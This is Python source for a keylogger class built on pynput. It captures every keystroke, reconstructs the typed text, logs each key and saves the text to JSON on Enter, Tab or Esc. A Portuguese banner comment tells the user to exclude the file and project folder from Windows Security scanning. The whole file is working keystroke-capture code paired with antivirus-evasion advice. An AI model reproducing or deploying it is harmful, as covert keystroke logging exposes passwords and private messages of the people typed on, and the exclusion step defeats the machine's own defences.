#################################################################################################
# LEMBRE-SE DE ADICIONAR ESSE ARQUIVO E A PASTA DESSE PROJETO EM EXCLUSÃO NO WINDOWS SECURITY
#################################################################################################
from pynput.keyboard import Listener
# import pynput
# if o pc for windows:
# from pynput.keyboard._win32 import KeyCode
from pynput import keyboard
from Loggers.Logger import Logger
from Functions.JSONLib import JSONLib

logger = Logger()
JSON = JSONLib()

class KeyLogger(Logger):

    def __init__(self):
        self.keys = []
        self.text = ""

    def __add_in_text(self, txt) -> None:
        self.text += txt
        self.set_text(self.text)

    def __replace_quotation_marks_and_key_classes(self, key) -> None:
        if '''"'"''' in str(key):
            self.__add_in_text("'")
        if """'"'""" in str(key):
            self.__add_in_text('"')
        if not "Key." in str(key):        
            self.__add_in_text(str(key).replace("'", ""))
    
    # def __() -> 
    # Imagine a pessoa usar as teclas para a esquerda
    # e querer deletar uma parte em específico, ou melhor 
    # usar Ctrl + Shift + Left ou Right 
    # / Ctrl + A para zerar o texto;
    # 
    
    def __remove_last_digit_from_text(self) -> None:
        self.set_text(self.get_text()[:-1])
            
    def __add_pressed_key_in_list_of_texts(self, key) -> None:
        functions_keys = ["Key.enter", "Key.tab", "Key.esc"]

        if not str(key) in functions_keys:
            print(str(key) == "Key.space")
            if str(key) == "Key.space":
                self.__add_in_text(" ")
            if str(key) == "Key.backspace":
                self.__remove_last_digit_from_text()
            else:
                self.__replace_quotation_marks_and_key_classes(key)
        if str(key) in functions_keys:
            self.set_keys(self.get_text(), text=True)
            self.set_keys(str(key).replace("Key.", "").upper(), key_press=key, text=False)
            from Loggers.app_logger import ROOT
            
            JSON.save_text_data(self.get_text(), str(key).replace("Key.", "").upper())
            self.text = "" 
        if str(key) == "Key.cmd":
            self.set_keys("SUPER", key_press=key, text=False)

    def set_keys(self, key: str, **kwargs) -> None:
        self.keys.append(key)
        logger.log_info(message=f"'{key}'", **kwargs)
    
    def get_keys(self) -> list:
        return self.keys

    def set_text(self, text: str) -> None:
        self.text = text
        
    def get_text(self) -> str:
        return self.text

    def on_press(self, key) -> str:
        logger.log_debug(message=f"{key} pressed")
        logger.log_info(message=f"{key}", key_press=key, text=False)
        self.__add_pressed_key_in_list_of_texts(str(key))
        print(self.get_keys())
        
    def on_release(self, key) -> str:
        logger.log_debug(message=f"{key} released")
        
    def keyboard_listener(self) -> None:    
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        listener.stop()
            